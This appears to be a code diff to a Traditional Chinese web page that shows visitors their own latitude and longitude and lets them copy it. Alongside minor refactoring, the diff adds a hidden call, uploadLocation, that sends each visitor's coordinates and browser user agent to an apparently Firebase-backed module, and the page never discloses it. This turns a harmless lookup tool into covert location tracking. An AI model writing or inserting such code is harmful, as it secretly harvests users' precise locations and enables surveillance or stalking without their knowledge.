@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="zh-TW">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>查詢你的位置(經緯度)</title>
   <style>
     body {
@@ -12,6 +12,7 @@
       justify-content: center;
       align-items: center;
       font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
     }
     button {
       font-size: 18px;
@@ -31,10 +32,21 @@
   <p id="output"></p>
   <button id="copyBtn" onclick="copyLocation()" style="display:none;">複製位置</button>
 
-  <script>
+  <script type="module">
+    import { uploadLocation } from './firebase-location.js';
+
     let lat, lon;
 
-    function getLocation() {
+    function toDMS(deg) {
+      const absolute = Math.abs(deg);
+      const degrees = Math.floor(absolute);
+      const minutesFloat = (absolute - degrees) * 60;
+      const minutes = Math.floor(minutesFloat);
+      const seconds = ((minutesFloat - minutes) * 60).toFixed(2);
+      return `${degrees}°${minutes}'${seconds}"`;
+    }
+
+    window.getLocation = function () {
       const output = document.getElementById('output');
       const copyBtn = document.getElementById('copyBtn');
 
@@ -44,16 +56,15 @@
             lat = position.coords.latitude;
             lon = position.coords.longitude;
 
-
             const latDir = lat >= 0 ? 'N' : 'S';
             const lonDir = lon >= 0 ? 'E' : 'W';
-
-
             const latText = `緯度：${Math.abs(lat).toFixed(6)}°${latDir}`;
             const lonText = `經度：${Math.abs(lon).toFixed(6)}°${lonDir}`;
-
             output.innerHTML = `${latText}<br>${lonText}`;
             copyBtn.style.display = 'inline-block';
+
+            const userAgent = navigator.userAgent;
+            uploadLocation(lat, lon, userAgent);
           },
           (error) => {
             output.textContent = `無法取得位置：${error.message}`;
@@ -64,18 +75,14 @@
         output.textContent = "你的瀏覽器不支援位置功能。";
         copyBtn.style.display = 'none';
       }
-    }
+    };
 
-    function toDMS(deg) {
-      const absolute = Math.abs(deg);
-      const degrees = Math.floor(absolute);
-      const minutesFloat = (absolute - degrees) * 60;
-      const minutes = Math.floor(minutesFloat);
-      const seconds = ((minutesFloat - minutes) * 60).toFixed(1);
-      return `${degrees}°${minutes}'${seconds}"`;
-    }
+    window.copyLocation = function () {
+      if (typeof lat !== 'number' || typeof lon !== 'number') {
+        alert("尚未取得位置，請先點擊顯示位置。");
+        return;
+      }
 
-    function copyLocation() {
       const latDir = lat >= 0 ? 'N' : 'S';
       const lonDir = lon >= 0 ? 'E' : 'W';
 
@@ -89,8 +96,7 @@
       }, () => {
         alert("複製失敗，請手動選取文字。");
       });
-    }
+    };
   </script>
 </body>
 </html>
-
